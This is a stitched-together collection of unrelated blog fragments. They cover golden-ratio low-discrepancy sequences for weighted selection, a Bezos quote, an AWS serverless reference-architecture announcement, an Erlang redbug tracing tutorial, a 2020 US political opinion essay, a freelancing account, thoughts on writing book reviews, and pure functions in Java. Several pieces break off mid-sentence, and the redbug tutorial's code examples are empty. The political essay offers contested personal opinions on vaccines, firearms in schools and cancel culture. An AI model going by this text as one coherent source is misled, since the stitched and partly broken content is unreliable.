<p>1.61803398875 is the golden ratio and since we are dealing with values between 0 and 1, you could also use 0.61803398875 instead which is the fractional part of the golden ratio, but is also 1 divided by the golden ratio (the golden ratio conjugate).</p>
<p>The golden ratio is a good choice here because it’s an irrational number, meaning that from a mathematical point of view (ignoring limitations of computers for a second) it won’t ever repeat values.</p>
<p>The golden ratio is also an excellent choice among irrational numbers because it is the most irrational number.  Less irrational numbers – like pi – still don’t repeat but they have “near repeats” which make them less good of a choice.  Then there are numbers like the square root of 2, which are pretty decently irrational – more than pi, but less than the golden ratio.</p>
<p>An alternate way to write the code is like this, which gives you “random access” to the sequence, but is more prone to having floating point precision issues.</p>
<pre title="">float GetValue(int index, float seed)
{
  float newX = seed + float(index) * 1.61803398875f;
  return newX - floor(newX);
}
</pre>
<p>If you use this in our problem for generating floating point values between 0 and 1 and remapping to integers 0 through 9, you will get fairly even counts of occurrences of those integers (a fairly flat histogram) from both small and large sections of the sequence.</p>
<p>Here is a screenshot of the program generating a sequence of 80 items, using the techniques talked about so far.</p>
<p><a href="https://demofox2.files.wordpress.com/2020/06/unweighted50.png"><img src="https://demofox2.files.wordpress.com/2020/06/unweighted50.png?w=800"></a></p>
<p>It’s hard to tell what the histogram looks like from that, but it is still a bit interesting looking at the difference in patterns of the numbers chosen.  There are seeming patterns even in the golden ratio because the values are quantized to 10 possible values.</p>
<p>Here are histograms of 100 samples. It shows that white noise is doing noticeably worse than the irrational numbers, but the irrational numbers don’t have a winner that is easy to discern with the naked eye.  Sequential can’t even be seen because it is by definition a completely flat histogram and so is a flat line at y=0.1.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/unweighted100.png"><img src="https://demofox2.files.wordpress.com/2020/06/unweighted100.png?w=800"></a></p>
<p>Here are histograms of 10,000 samples. White noise and pi look about the same, but golden ratio and square root of 2 are much closer to the actual flat histogram value / sequential sequence.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/unweighted10k.png"><img src="https://demofox2.files.wordpress.com/2020/06/unweighted10k.png?w=800"></a></p>
<p>Here are histograms of 1,000,000 samples. White noise is way worse than everything else, but it’s hard to see a winner from the rest of the group.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/unweighted1m.png"><img src="https://demofox2.files.wordpress.com/2020/06/unweighted1m.png?w=800"></a></p>
<p>Here we remove white noise from the graph to see the others better. Pi shows being the worst. Square root of two is next, and then the golden ratio which is closest to the sequential / flat histogram line.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/unweighted1mb.png"><img src="https://demofox2.files.wordpress.com/2020/06/unweighted1mb.png?w=800"></a></p>
<h2>Round Robin vs Random Integers</h2>
<p>When using white noise, round robin is just random integers.  It’s the same as rolling dice.  So what is the difference?</p>
<p>In the last section I say that using a low discrepancy sequence is better than using white noise, because it reaches the target histogram more accurately with fewer samples – fewer rolls of the dice.</p>
<p>The downside to this though is that the numbers are no longer random… a person viewing the sequence of numbers can almost certainly guess what the next number is going to be.</p>
<p>So, that makes it not useful to use these for places where randomization is important – like when gambling or for cryptography.</p>
<p>But, where this is useful is for places where fairness matters but randomness does not.</p>
<p>One example could be pulling work items from a work queue.  Who cares if it is possible to guess which thread is going to get assigned the next item of work?  The important thing is that the work is spread evenly.</p>
<p>Another example is in numerical integration in monte carlo integration, and also other stochastic rendering situations.  This is more what I care about.  In these situations, you don’t care if the choice can be predicted or not, but if you can reduce the amount of error vs the target distribution in fewer samples that means you’ll have less noise in your resulting image, which is ::chef kiss:: oh so great.  A better image for the same processing power.</p>
<p>If you were in a situation that wanted randomness, but you still wanted some of these benefits, you should check out “blue noise”, which is a randomized version of low discrepancy sequences.  A good place to start might be my post on generating blue noise in 2 dimensions, which you could modify to only generate 1 dimensional blue noise and use for this purpose.</p>
<p><a href="https://blog.demofox.org/2017/10/20/generating-blue-noise-sample-points-with-mitchells-best-candidate-algorithm/" rel="nofollow">https://blog.demofox.org/2017/10/20/generating-blue-noise-sample-points-with-mitchells-best-candidate-algorithm/</a></p>
<h2>Weighted Round Robin</h2>
<p>Let’s say you find yourself in the same situation as before but now there are weighted probabilities involved.</p>
<ul>
<li>For the loot drop situation, different loot should be awarded with different probabilities.</li>
<li>For the work queues, you could have different powered CPUs servicing the work queues maybe.  More powerful processors should be more likely to get work served to them perhaps.</li>
</ul>
<p>For our situation, we’ll say that the weight of item 0 is 1, the weight of item 1 is 2, and so on, up to the weight of item 9 being 10.</p>
<p>Let’s check out our options again.</p>
<p>First, we could go sequentially.  This means that our sequence would go like this: 011222333344444… etc.</p>
<p>A possible issue with this (again, depending on your specific needs) is that it is even, but it goes through every occurrence of a number before moving to the next number.  If it was desired that the numbers be visited in a more interleaved fashion, you’d want to try something else. </p>
<p>The next thing you could try is to take the item weights and divide them by the total of the item weights, so that they add up to 1.0.  This would make them normalized.  From here, we could roll a random floating point number between 0 and 1, find the item that has the range that contains that floating point number, and use that as the selected item.</p>
<p>That would solve the problem I mentioned, but would introduce the problem of white noise: while large sample counts have the right histogram (distribution), small sample counts don’t.</p>
<p>We could also use irrational numbers again, which would do better at reaching the correct histogram than white noise but become deterministic like sequential, but still shuffled “a bit”.</p>
<p>Here’s the program output for 80 item sequences of the various techniques:<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted80.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted80.png?w=800"></a></p>
<p>Here are histograms with 100 samples. The irrationals are all doing pretty well. White noise is not doing great. Strangely, sequential is also not doing real great for the last value because the sequence length doesn’t divide 100 evenly this time!<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted100.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted100.png?w=800"></a></p>
<p>Here are histograms with 10,000 samples.  It’s harder to see for sure who is winning by nature of the graph, compared to the last section, but we can see white noise is not doing great.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted10k.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted10k.png?w=800"></a></p>
<p>Here are histograms with 1,000,000 samples. It’s nearly impossible to see anything about it.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted1m.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted1m.png?w=800"></a></p>
<p>Here is the graph of subtracting sequential from the others.  It shows that white noise is by far the worst.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted1mb.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted1mb.png?w=800"></a></p>
<p>Removing white noise from that graph, we can see that pi is worst, golden ratio is best, and square root of 2 isn’t far behind the golden ratio.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted1mc.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted1mc.png?w=800"></a></p>

<p>If you look at the code, you might be saying to yourself that the weighted version isn’t great because you need a loop to convert the 1D floating point value in [0,1] to the weighted item chosen.  If you switched to using an alias table, it’d be an O(1) constant time operation, but then the 1D value would not be enough – you’d need a 1d value and a biased coin flip.  AKA just a 2d value that is [0,1] on each axis.  It would be interesting to compare an alias table / 2D LDS sequence to see how it converged versus this method.  I really, really, should have done …</p></div></div>

Jeff Bezos sums this up in one elegant quote:</p><blockquote>You can build a business strategy around the things <strong>that are stable in time</strong>. It’s impossible to imagine a future 10 years from now where a customer comes up and says, “Jeff I love Amazon, I just wish the prices were a little higher.” Or, “I love Amazon, I just wish you’d deliver a little slower.” Impossible.<p>So we know the energy we put into these things today will still be paying off dividends 10 years from now. <strong>When you have something you know is true, you can afford to put a lot of energy into it.<p>‍</p></strong>— Jeff Bezos</p></blockquote><p>Riffing from there, I thought it prudent to come up with my own, evolving list of permanent assumptions. The exercise itself is one of enormous introspection and as such I couldn't recommend it enough. Enjoy, and I'd love to see yours as well!</p><ol role="list"><li>Most people, consciously or unconsciously, lie to themselves constantly to fit a self image from which they derive benefit.</li><li>Stories shape everything around us and form the loose fabric of reality.

			<p><strong>Serverless</strong> gives us the power to focus on delivering value to our customers without worrying about the maintenance and operations of the underlying compute resources. Cloud providers (like AWS), also give us a huge number of managed services that we can stitch together to create incredibly powerful, and massively scalable serverless microservices.</p>
<p>Almost 2 years ago now, I wrote a post on <strong><a href="https://www.jeremydaly.com/serverless-microservice-patterns-for-aws/">Serverless Microservice Patterns for AWS</a></strong> that became a popular reference for newbies and serverless veterans alike. The capabilities of serverless have changed dramatically since then, opening up a ton of new patterns and possibilities. Today I’m announcing the <a href="https://www.jeremydaly.com/serverless-reference-architectures/"><strong>Serverless Reference Architectures Project</strong></a>. This project is intended to capture, share, explore, and debate the patterns and practices being used in serverless production applications today.<span id="more-2764"></span></p>
<p>To really understand what’s going on, it’s useful to take a bird’s-eye view of a pattern, understand how data flows back and forth through the different components, and think about the implications on your application. I’ve created interactive architectures that let you explore the details of each component and walk you through the different steps.</p>
<p>You also need to understand how a pattern would come alive with AWS services and how you can configure it for your implementation. I’ve partnered with <strong><a href="https://www.stackery.io/" target="_blank" rel="noopener">Stackery</a></strong> and integrated their interactive canvas so that you can explore these patterns, customize them, and generate updated SAM templates automatically.</p>
<p>Finally, you want to understand how you’d replicate the pattern in production using infrastructure-as-code to ensure repeatable, safe deployments. You’re free to use the generated SAM templates, or take advantage of community supplied templates for the Serverless Framework, CDK, and others.</p>
<p>This project hopes to encapsulate all of this in one place so you can start by learning about the pattern fundamentals, then go all the way through to deploying a functional version of the pattern into your own AWS account (all with just a few clicks).</p>
<p>By partnering on sharing common serverless reference architectures and patterns, we can help others unlock the true power of serverless with AWS. We are starting with just a few patterns, but I plan on adding several more and hope that <a href="https://github.com/jeremydaly/reference-architectures" target="_blank" rel="noopener"><strong>you will contribute</strong></a> as well.</p>
<p><strong><a href="https://www.jeremydaly.com/serverless-reference-architectures/">Give it a try</a>, and let me know what you think!</strong></p>

</div><p>Let’s now look at the actual message produced by redbug. By default
messages are printed to the standard output, but it’s also possible to
dump them to file:</p><div>
<div>
<pre><code data-lang="erlang"><span>% 15:20:20 &lt;0.31.0&gt;({erlang,apply,2})
</span><span>%</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>3</span><span>,</span><span>2</span><span>,</span><span>1</span><span>])</span></code></pre>
</div>
</div><p>Depending on the version of redbug you are using, you may get a
slightly different message. In this case, the message is split across
two lines. The first line contains a <strong>timestamp</strong>, the <strong>Process Identifier</strong>
(or <em>PID</em>) of the Erlang process which invoked the function and the
<strong>caller</strong> function. The second line contains the function called,
including the input arguments. Both lines are prepended with a <code>%</code>,
which reminds us of the syntax for Erlang comments.</p><p>We can also ask Redbug to produce an extra message for the return
value. This is achieved using the following syntax:</p><div>
<div>
<pre><code data-lang="erlang"><span>4</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>(</span><span>"lists:sort/1-&gt;return"</span><span>).</span>
<span>{</span><span>30</span><span>,</span><span>1</span><span>}</span></code></pre>
</div>
</div><p>Let’s invoke the <code>lists:sort/1</code> function again. This time the output
from redbug is slightly different.</p><div>
<div>
<pre><code data-lang="erlang"><span>5</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>3</span><span>,</span><span>2</span><span>,</span><span>1</span><span>]).</span>

</div>
</div><p>In this case two messages are produced, one when entering the function
and one when leaving the same function.</p><p>When dealing with real code, trace messages can be complex and
therefore hardly readable. Let’s see what happens if we try to trace
the sorting of a list containing 10.000 elements.</p><div>

</div><p>Most of the output has been truncated here, but you should get the
idea. To improve things, we can use a couple of redbug options.  The
option <code>{arity, true}</code> instructs redbug to only display the number of
input arguments for the given function, instead of their actual
value. The <code>{print_return, false}</code> option tells Redbug not to display
the return value of the function call, and to display a <code>…​</code>  symbol,
instead. Let’s see these options in action.</p><div>

</div><p>We can also activate redbug for several function calls

</div>
</div><p>Last but not least, redbug offers the ability to only display results
for matching input arguments. This is when the syntax looks a bit like
magic.</p><div>
<div>

</div>
</div><p>In the above example, we are telling redbug that we are only
interested in function calls to the <code>lists:sort/1</code> function when the
input arguments is the list <code>[1,2,5]</code>. This allows us to remove a huge
amount of noise in the case our target function is used by many actors
at the same time and we are only interested in a specific use case.
Oh, and don’t forget that you can use the underscore as a wildcard:</p><div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3389">

<div>
<p>Those that know me, know that I am both bold and resolute. I stand by my thoughts / comments, yet I attempt to keep an open mind, analyze a situation, self-reflect on any biases, and integrate feedback. I even go so far as to analyze my confidence level, see <a href="https://predictionbook.com/" target="_blank" rel="noopener noreferrer">predictionbook.com</a>.</p>
<p>With that in mind. I want to share how utterly angry and helpless I feel —</p>
<p>I can’t share my true thoughts, hell my analysis, of the current political situation in the U.S. Although I have written on it countless times, I end up deleting the posts.</p>
<p>Why?</p>
<p>It’s not safe to share thoughts.</p>
<h2>State of Affairs</h2>
<p>Today, sharing one’s opinion can cost you your livelihood, your ability to communicate, and more.</p>
<p>Historically, that was always true, perhaps more-so. We’re now returning to the status quo — repression.</p>
<p>Today’s flavor of repression is one where offending someone randomly across the globe, can cost you your job. That person may not have a standing in your community and may not have a relationship with your employer. However, they can amplify their voice, tweet your employer, and your employer (scared out of it’s mind by the current situation) will terminate you. That is the state of affairs today. It doesn’t matter if you’re correct or innocent. It doesn’t even matter if 99.9% of people aren’t offended by what you said — we are now in a world of “<a href="https://en.wikipedia.org/wiki/Online_shaming#Cancellation" target="_blank" rel="noopener noreferrer">cancel culture</a>“.</p>
<h2>Finding Middle Ground</h2>
<p>In the United States in 2020, we have two paths. One path leads to an ever more left-leaning populous “uprising”; the other path leads to an ever more right-leaning populous “uprising”. I don’t see an alternative, outside of some quite-frankly comical alternatives (e.g. President Mitt Romney, with VP Bernie Sanders).</p>
<p>One way or another, I lose. No one is speaking up for my beliefs or representing me.</p>
<p>I sense I’m not alone. Everyone I speak to left or right, hates the current state of affairs. Most of us even agree on <em>why</em> we distrust the system. Unfortunately, we can’t elect someone to fix the system. Neither Trump, nor Biden, nor Bernie, nor anyone on the ballot accurately represents or even inspires us.</p>
<p>By and large, I believe this is due to the “absolute” nature of our current social strife. Take the question:</p>
<blockquote><p>Why can’t I be anti-vaccine and pro-choice?</p></blockquote>
<p>You would suspect everyone would agree that we “own” our bodies. If that were true, then you would effectively have to be pro-choice AND support people’s right to choose what to put in their bodies; body ownership is the middle ground. I wish we could coalesce around the middle ground, then compromise on edge cases, enabling progress.</p>
<p>Take another example:</p>
<blockquote><p>Why don’t we do firearms training in schools?</p></blockquote>
<p>It’s an honest question — we’ve had the 2nd amendment for hundreds of years. Similar to driving a car, we should train our youth to handle firearms. I suspect we all know the reason this is not occurring — because a significant portion of the United States is fearful of firearms.</p>
<p>From the evidence, the fear is unjustified. We have evidence that with a good training program and robust mental evaluation process, firearms by-and-large are safe for society. <a href="https://en.wikipedia.org/wiki/Firearms_regulation_in_Switzerland" target="_blank" rel="noopener noreferrer">See Switzerland</a>:</p>
<blockquote><p>Swiss males grow up expecting to undergo basic military training, usually at age 20 in the recruit school..</p>
<p>…Prior to 2007, members of the Swiss Militia were supplied with 50 rounds of ammunition for their military weapon in a sealed ammo box that was regularly audited by the government…</p>
<p>…Every person with a Swiss citizenship, aged 10 years or older, can take part at any federal ranges and will be able to shoot for free with the ordinance rifle…</p>
<p>…In 2016, there were 187 attempted and 45 completed homicides, for a homicide rate of 0.50 per 100,000 population, giving Switzerland one of the lowest homicide rates in the world…</p></blockquote>
<p>Further, firearms are already widely available (<a href="https://en.wikipedia.org/wiki/Estimated_number_of_civilian_guns_per_capita_by_country" target="_blank" rel="noopener noreferrer">300+ million guns in the U.S.</a>) &amp; availability enshrined in law.</p>
<p>Sorrowfully, evidence doesn’t matter here; fear guides many. Yoda has some insights here:</p>
<blockquote><p><span data-parade-type="promoarea" data-parade-location-types="promoarea" data-parade-location-ids="article" data-parade-views="false" data-parade-touches="false" data-parade-clicks="false" data-parade-mouseovers="false">Fear is the path to the dark side. Fear leads to anger. Anger leads to hate. Hate leads to suffering.</span></p>
<p>— George Lucas (Yoda)</p></blockquote>
<h2>The False Dichotomy</h2>
<p>I don’t agree with the left or the right on many things in United States politics. In fact, I find most of the arguments a false dichotomy, designed to garner votes. To share one’s full thoughts would cause either or both sides to lash out, even though evidence may support the claims / musings.</p>
<p>Regretfully, this leaves me and many others out of the public discourse. While most of us have heard,</p>
<blockquote><p>The only thing necessary for the triumph of evil is for good men to do nothing.</p>
<p>— Edmund Burke (attributed)</p></blockquote>
<p>It’s not quite that simple and I prefer another sentiment:</p>
<blockquote><p>A man dies when he refuses to stand up for that which is right. A man dies when he refuses to stand up for justice. A man dies when he refuses to take a stand for that which is true.</p>
<p>— Martin Luther King Jr.</p></blockquote>

I am very confident few people fully agree with either side in this political theater. We have extremists on either side shouting and being amplified by social media. In truth, the vast majority of us don’t agree [fully] with either extreme. Most of us, want to “live and let live” — that’s the American way. We’re a country founded on our hatred for taxes and the desire to live free from persecution. Please, please.. Don’t let that change.</p>
<p>It’s easy to decide “what’s right” when you look at it through that lens — am I persecuting others or increasing taxes (arguably a form of persecution)? If either are true, likely we should reconsider our stance.</p>
<h2>The Chaos</h2>
<p>Today, we are edging towards chaos. We all feel it. Riots, job loss, deadly diseases, [trade] wars, homelessness… We need leadership that can unite us.</p>
<p>Unfortunately, many of our would-be leaders have opted out or have been pushed out of this system. They’ve become engineers, scientists, bloggers — too scared to share their opinions (<a href="https://en.wikipedia.org/wiki/Slate_Star_Codex" target="_blank" rel="noopener noreferrer">even shutting down</a>). To hold a nuanced opinion different from the “socially accepted” by one group or another will get you “canceled”. In this case, “canceled” can mean anything from losing your job, to losing financial platforms/instruments (i.e. PayPal, VISA, YouTube revenue, etc.), to receiving threats on your life.</p>
<p>We have an ongoing pandemic, with millions in the United States likely about to perish, the economy collapsing, and we still cannot escape the politics.</p>
<p>I’m not hopeful.</p>
<p>I have so many musings, stories, and analyses I’d like to share, but neither facts nor my opinions matter.</p>
<p>Let’s be honest —</p>
<ul>
<li>I’m a white, cisgender, straight, male</li>
<li>I work as a technical manager in a research group, at a bank</li>
<li>I’m socially liberal in many ways and conservative in others</li>
<li>I grew up lower-middle class; now, I’m upper-middle class</li>
<li>I don’t attribute myself to any political party</li>
</ul>
<p>A large number of people dismiss or overlook me because of my background. Those who don’t outright dismiss me are also not likely to support my interest(s).</p>
<h2>Meritocracy or Bust</h2>
<p>What scares me is that I am a father and I am fearful for my children’s future. I was raised with the understanding that America is a meritocracy. Regardless of your race, gender, or creed, you should have the ability to make a life in the United States,<strong><em> to build a future for your children</em></strong>. Sadly, I don’t see the same core mission today. None of the political parties or the government at large appears forward-looking, for the children. Perhaps, that’s because of a <a href="https://www.cdc.gov/nchs/nvss/births.htm" target="_blank" rel="noopener noreferrer">declining birthrate</a>, I’m not sure.</p>
<p>As someone with children, I’m pleading for a group to come together to challenge the current status quo and equitably look to improve our society. We do have systemic problems that need to be fixed. Compromises will need to be made, but I don’t believe we need sacrifices from anyone.</p>
<p>The racism and sexism needs to stop. I suspect, most of us (though, not all) want a meritocracy, a hierarchy based on merit. Unfortunately, what’s being propagated is a hierarchy based on race, sex and orientation — the under-privileged. It’s clear from the countless stories we see in the news. I am sure you are tired of the racism, as am I. That’s probably true regardless of which side of the political spectrum you fall.</p>
<p><em>No one’s</em> value to society should be assessed by their race, gender or creed. A person’s value should be based off what they have to offer to a given group, organization, or society. We can rally around that idea (that we’re all equal, differentiated on merit) and work to improve. It’s a middle ground we can [mostly] agree on. From there, we can fix the injustices.</p>
<p>What horrifies me, is that even to express that <em>“we’re all equal” </em>is a challenge to this new socio-economic hierarchy. <em>No one</em> is representing me or has my family’s best interests in mind. Realistically, I don’t expect anyone to have <em>my family’s interests</em> in mind, but I don’t want my potential / rights eroded.</p>
<p>Due to this political tug of war, both sides of the political spectrum want to diminish our rights; they’re only bickering over which rights to diminish. Let’s stop this tug of war and come together.</p>
<p>If we don’t come together, soon enough we won’t have a democracy, or frankly, a future to build for.</p>
<h2>In the Words of John Adams…</h2>
<blockquote><p>Remember, democracy never lasts long. It soon wastes, exhausts, and murders itself. There never was a democracy yet that did not commit suicide. It is in vain to say that democracy is less vain, less proud, less selfish, less ambitious, or less avaricious than aristocracy or monarchy. It is not true, in fact, and nowhere appears in history. Those passions are the same in all men, under all forms of simple government, and when unchecked, produce the same effects of fraud, violence, and cruelty. When clear prospects are opened before vanity, pride, avarice, or ambition, for their easy gratification, it is hard for the most considerate philosophers and the most conscientious moralists to resist the temptation. Individuals have conquered themselves. Nations and large bodies of men, never.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div v-pre="">
        <p>I've been offline (blog wise) for nearly 3 months now - <a href="https://sarfas.codes/blog/laravel-route-model-binding/">in fact my last post was on April 12th!</a>.</p>
<p>A lot of that has come down to me moving house, COVID-19 messing with my working schedule, and some other things I've been working out in the background. The main thing that's changed here is; <strong>I'm now self-employed</strong></p>

<p>Having taken on some large projects at my main job, I had to cut back on my side-projects and contracting work in the evenings. This was to keep me from burning out as I was working too much.</p>
<p>Fast forward to Coronavirus days, and I found myself missing the contracting work. I loved working from home, and being able to structure the freelance hours around my own schedule. So I decided I was going to take this on full time, and pack in my dayjob.</p>
<p>I left my last PAYE ("normal job") role 3 weeks ago now, and have been working full time on <a href="https://cleveregg.io/">CleverEgg Digital</a> with a close group of clients.</p>

<p>For me, the main positive is controlling my own hours.</p>
<p>If I want to take a day off - I just do it. Yes, I'm not earning money that day, so I need to catch it up; but the option is there if I need it. There's no HR process, no holiday bookings, nothing. I take a day, when I like.</p>
<p>The hours. I'm most efficient after midday. Due to this, most of my contract work is done between the hours of 11am and 7pm. This gives me the freedom to do whatever I like in the mornings, and still have a late night if I like - I don't have to get up for work early ⏰</p>

<p><strong>Time Management</strong></p>
<p>If you're considering doing this, you need to be your own worst critic and be strict on your time. Time is literally money in the contracting world.</p>
<p>You don't have a boss staring down you 24/7. Or checking up on your progress everyday. If you wanna earn some money, do it off your own back.</p>
<p>Once you get a few clients, the thought of invoices being settled will be a good motivator - so that's always a bonus.</p>
<p>I've found that working for yourself means you do need to know a little more than just "your trade". Here's a few I can mention off the top of my head;</p>
<ul>
<li>Basic Accounting,</li>
<li>Fundamentals of understanding Contracts, Terms, and negotiation thereof,</li>
<li>Marketing &amp; pricing</li>
</ul>
<p>I'm a developer by trade, yet I've had to use all of the above 3 in the last 24 hours. Naturally I could pay someone to do all of them; but I'm not in any financial position to do so.</p>

<p>I should have done this sooner! I'm far happier in my work, as well as in a better position with my mental health.</p>
<p>I thought I'd be working longer hours to chase the extra money - given I can do so. However, I actually work less than I did with my "standard job"; and I'm no worse off financially.</p>

<p>Freelance/Contracting isn't for everyone. Clients are very hard to come by, especially in today's economy and situations. I've been extremely lucky in that I've found a handful of clients who are well backed financially, and are unaffected by the pandemic.</p>
<p>I cannot express how much I owe of this to the <a href="https://laravelphp.uk/">LaravelUK</a> community. Both in sourcing/sharing clients, and giving me support and advice for the last 2 years whilst I ponder over this decision.</p>
<p>If you do take the plunge and go into this chaos, here's a few tips;</p>
<ul>
<li>Find a community of like-minded people within your industry</li>
<li>Ensure that you have enough money that you can go without work for a bit
<ul>
<li><em>You won't be getting sick pay, or Annual Leave</em></li>
</ul></li>
<li>Don't under charge. Cheaper clients are cheap for a reason. Those that want your time, respect your trade, and want to look after you will pay for it.</li>
<li>Be confident in your work; but not complacent / arrogant</li>
<li><strong>Enjoy it. Being your own boss is awesome!</strong></li>
</ul>    </div></div>]]>

</blockquote>

<p>With the coronavirus shortening my work commute into a walk down the hall, I’ve been able to read more in the mornings. Now that I’ve been gifted more time in the day, I am finishing about a book a week (I’m privileged to have at least an hour a day for reading, and that time quickly adds up). It has been amazing to return to my teenage reading habits when my parents feigned exasperation at my perpetual nose-in-book lifestyle - “is that kid reading again?”. In these tumultuous times, books have also been a welcome respite (well-documented positive effects of reading on mental well-being probably don’t hurt).</p>

<p>Reading more, I couldn’t help but notice book reviews everywhere. Inspired, I wrote <a href="https://www.micahlerner.com/books/2020-05-30-solaris.html">a</a> <a href="https://www.micahlerner.com/books/2020-05-21-the-man-who-solved-the-market-how-jim-simons-launched-the-quant-revolution.html">few</a>, but found myself asking what I wanted to get out of the creative energy I was channeling into them (after all, I’m not a professional book-review-writer and my time is limited). In order to think clearly about the topic, I sought inspiration in the work of other writers.</p>

<h2 id="how-do-other-writers-approach-book-reviews">How do other writers approach book reviews?</h2>

<p>With the question “how should I write about what I’ve been reading?” in mind, I started compiling examples of book reviews and categorizing them by style:</p>

<ul>
  <li><strong>Persuasive reviews</strong>: I bucket reviews <a href="https://www.nytimes.com/2019/09/16/books/review-night-boat-tangier-kevin-barry.html">like those</a> from the NYTimes into this category. Even though the author of the inevitably informs you about the book’s content, they’re advocating that their readers purchase the book (or don’t purchase the book in some case). Frequently the review also gives a background on the book’s literary lineage.</li>
  <li><strong>Summary reviews</strong>: Products like <a href="https://www.blinkist.com/en/nc/library/">Blinkist</a> or <a href="https://www.nateliason.com/notes/antifragile">Nat Eliason’s book reviews</a> fall into this category. I think there’s a place for summarization-style reviews of non-fiction <a href="https://commoncog.com/blog/the-3-kinds-of-non-fiction-book/#branchbooks">“branch books”</a> - if one were to imagine knowledge as a tree, “branch books” typically cover a single topic on the edge of the tree, rather than attempting to be a wide-reaching, foundational tome of a subject area.</li>
  <li><strong>Thematic reviews</strong>: The New York Review of Books <a href="https://www.nybooks.com/articles/2020/07/02/what-is-college-worth/">often</a> <a href="https://www.nybooks.com/articles/2019/11/07/heritage-of-evil/">combines</a> discussion of several books into a general overview of a topic. This approach is well-suited to academics or subject-matter experts who have the time (and intellectual stamina!) to read a variety of books connected to a common thread.</li>
  <li><strong>Deep-dive reviews:</strong> Slate Star Codex was (while I was writing this, the takedown of the blog happened) an <a href="https://slatestarcodex.com/2020/03/17/book-review-hoover/">example</a> of this category, with <a href="https://slatestarcodex.com/2020/06/01/book-review-origin-of-consciousness-in-the-breakdown-of-the-bicameral-mind/">opinionated book reviews</a> that form connections between the author’s well-formed thoughts and the subject matter at hand. They’re often witty and summarize the content as needed while weaving it into a story.</li>
</ul>

<p>With a general overview of possible styles loaded into my memory, I switched to thinking about what I was hoping to get out of the process.</p>

<h2 id="what-do-i-want-to-get-out-of-book-reviews">What do I want to get out of book reviews?</h2>

<p>After consuming diverse, different review styles, I realized that I could reduce my motivation for reviewing books to two goals: retention of what I learned (in the case of non-fiction) books and writing something other people enjoy reading.</p>

<p>Thankfully there is a large body of knowledge about how to accomplish the first goal using <a href="https://www.gwern.net/Spaced-repetition">spaced repetition</a>.</p>

<p>Spaced repetition is also called SRS, and there are many sources about how to use the system to increase retention:</p>
<ul>
  <li><a href="https://robertheaton.com/">Rob Heaton’s</a> blog post on <a href="https://robertheaton.com/2018/06/25/how-to-read/">How to read</a></li>
  <li><a href="http://augmentingcognition.com/ltm.html">Augmenting long term memory</a> discusses using Anki for deep reviews</li>
  <li>A (sic) Hahvahd Business Review <a href="https://hbr.org/2016/02/how-to-read-a-book-a-week">article</a> about retention and understanding</li>
</ul>

<p>Unfortunately, making book reviews enjoyable for other people is a more difficult problem, and the best path is being inspired by others. If you find a great review <a href="https://www.micahlerner.com/2020/06/13/micah.lerner@hey.com">send it my way</a>!</p>

While statelessness has a lot of benefits, it’s unfortunately rarely possible in the real world. In this post, I’d like to detail this stance of mine a bit.</p> <div> <h2 id="state-in-functional-programming">State in Functional Programming</h2> <div> <p>Functional Programming is based on a set of principles. Among those principles are <em>pure</em> functions:</p> <div> <blockquote> <p>A pure function is a function that has the following properties:</p> <ol><li><span>Its return value is the same for the same arguments</span></li><li><span>Its evaluation has no side effects</span></li></ol> </blockquote>  </div> <p>For example, the following function is <em>pure</em>:</p> <div> <div> <pre><code data-lang="java"><span>int</span> <span>timesTwo</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>
    <span>return</span> <span>value</span> <span>*</span> <span>2</span><span>;</span>
<span>}</span></code></pre> </div> </div> <p>A <em>pure</em> function allows <em>referential transparency</em>: the swapping of then function with its return value. With that in mind, the introduction of state may defeat the previous definition. For example, the following breaks <em>referential transparency</em>:</p> <div> <div> <pre><code data-lang="java"><span>class</span> <span>Multiplier</span> <span>{</span>

  <span>private</span> <span>int</span> <span>factor</span> <span>=</span> <span>1</span><span>;</span>

  <span>public</span> <span>int</span> <span>times</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>
    <span>return</span> <span>value</span> <span>*</span> <span>factor</span><span>;</span>
  <span>}</span>

  <span>public</span> <span>void</span> <span>setFactor</span><span>(</span><span>int</span> <span>factor</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>factor</span> <span>=</span> <span>factor</span><span>;</span>
  <span>}</span>
<span>}</span></code></pre> </div> </div> <p>Successive calls to <code>times()</code> with the same argument may return different results because the <code>setFactor()</code> method may have changed the <code>factor</code> attribute’s value between calls. Interestingly enough, a method can conform to the <em>referential transparency</em> property, but still break the no side-effects property. Here’s an example:</p> <div> <div> <pre><code data-lang="java"><span>class</span> <span>MemoizedMultiplier</span> <span>{</span>

  <span>private</span> <span>final</span> <span>int</span> <span>factor</span><span>;</span>
  <span>private</span> <span>final</span> <span>Map</span><span>&lt;</span><span>Integer</span><span>,</span> <span>Integer</span><span>&gt;</span> <span>results</span> <span>=</span> <span>new</span> <span>HashMap</span><span>&lt;&gt;();</span>

  <span>public</span> <span>MemoizedMultiplier</span><span>(</span><span>int</span> <span>factor</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>factor</span> <span>=</span> <span>factor</span><span>;</span>
  <span>}</span>

  <span>public</span> <span>int</span> <span>times</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>
    <span>int</span> <span>cache</span> <span>=</span> <span>results</span><span>.</span><span>get</span><span>(</span><span>value</span><span>);</span>
